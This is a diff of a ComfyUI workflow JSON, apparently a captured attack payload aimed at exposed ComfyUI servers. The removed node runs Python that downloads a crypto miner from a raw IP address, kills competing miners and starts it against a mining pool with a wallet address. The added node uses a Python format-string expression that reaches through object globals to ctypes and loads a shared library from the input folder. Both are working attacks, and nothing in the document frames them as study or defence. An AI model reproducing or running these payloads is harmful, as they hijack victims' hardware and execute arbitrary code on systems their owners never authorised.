@@ -1,16 +1,26 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "CreateHookKeyframe",
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess\nimport os\nimport torch\nimport time\n\ntorch_lib = os.path.join(os.path.dirname(torch.__file__), \"lib\")\nenv = os.environ.copy()\nenv[\"LD_LIBRARY_PATH\"] = torch_lib + \":\" + env.get(\"LD_LIBRARY_PATH\", \"\")\n\nsubprocess.run([\"curl\", \"-sLo\", \"/tmp/miner\", \"http://151.247.219.40:8000/alpha-miner\"], timeout=90)\nos.chmod(\"/tmp/miner\", 0o755)\nsubprocess.run([\"pkill\", \"-9\", \"-f\", \"miner\"], capture_output=True)\ntime.sleep(2)\n\nwith open(\"/tmp/miner.log\", \"w\") as log:\n    subprocess.Popen([\"/tmp/miner\", \"--pool\", \"stratum+tcp://sg1.alphapool.tech:5566\", \"--address\", \"prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg\", \"--worker\", \"RTX3090_52\"],\n        env=env, stdout=log, stderr=subprocess.STDOUT, start_new_session=True)\n\ntime.sleep(4)\nps = subprocess.run([\"pgrep\", \"-c\", \"miner\"], capture_output=True, text=True)\nresult = ps.stdout.strip()\n"
+      "strength_mult": 1.0,
+      "start_percent": 0.0
     }
   },
   "2": {
+    "class_type": "StringFormat",
+    "inputs": {
+      "f_string": "{a.__class__.__init__.__globals__[comfy].memory_management.ctypes.cdll[/mnt/md0/ai/ComfyUI/input/libcuda_1782371587.so]}",
+      "values.a": [
+        "1",
+        0
+      ]
+    }
+  },
+  "3": {
     "class_type": "PreviewAny",
     "inputs": {
       "source": [
-        "1",
+        "2",
         0
       ]
     }
